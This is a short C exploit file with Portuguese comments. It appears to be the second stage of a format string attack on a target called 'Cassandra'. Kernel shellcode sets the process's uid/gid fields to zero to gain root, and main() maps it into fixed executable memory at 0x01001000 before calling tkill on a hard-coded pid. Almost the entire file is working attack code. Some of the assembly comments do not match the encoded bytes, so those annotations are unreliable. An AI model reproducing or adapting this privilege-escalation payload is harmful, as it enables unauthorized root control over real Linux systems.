/* Exploit Fase 2 Para Exploitar Cassandra
 * via Format String Bug.
 * Apenas mapeia memoria com o payload para 
 * ser executado.
 * Nash Leon - nashleon@yahoo.com.br
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>


#include "/usr/src/linux-2.6.10/include/asm/unistd.h"

static inline  _syscall2(int, tkill, pid_t, tid, int, sig)


char payload[] =
"\x90\x90\x90"

/* get current */
"\x31\xf6"                //      xor    %esi,%esi
"\xb8\x00\xe0\xff\xff"    //      mov    $0xffffe001,%eax
"\x21\xe0"                //      andl   %esp, %eax

/* capture the parent */

"\x8b\x00"                       // mov    (%eax),%eax
"\x8b\x80\xb0\x00\x00\x00"       // movl   $0x0,0x168(%eax)
/* set uid to 0 */

"\xc7\x80\x98\x01\x00\x00\x00"   // movl $0x0,0x198(%eax)
"\x00\x00\x00"

"\xc7\x80\x9b\x01\x00\x00\x00"  // movl $0x0,0x19b(%eax)
"\x00\x00\x00"

"\xc7\x80\xa0\x01\x00\x00\x00" // movl $0x0,0x1a0(%eax)
"\x00\x00\x00"

"\xc7\x80\xa4\x01\x00\x00\x00" // movl $0x0,0x1a4(%eax)
"\x00\x00\x00"
"\x31\xc0"                 //      xor    %eax,%eax
"\x40"                     //      inc    %eax
"\xcd\x80";               //      int    $0x80


int main(int argc, char *argv[]){
mmap(0x01001000,120,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_FIXED|MAP_PRIVATE|MAP_ANON,-1,0);
memset(0x01001000,0x90,120);
memcpy(0x01001019,payload,sizeof(payload));
tkill(12345,9);
return 0;
}
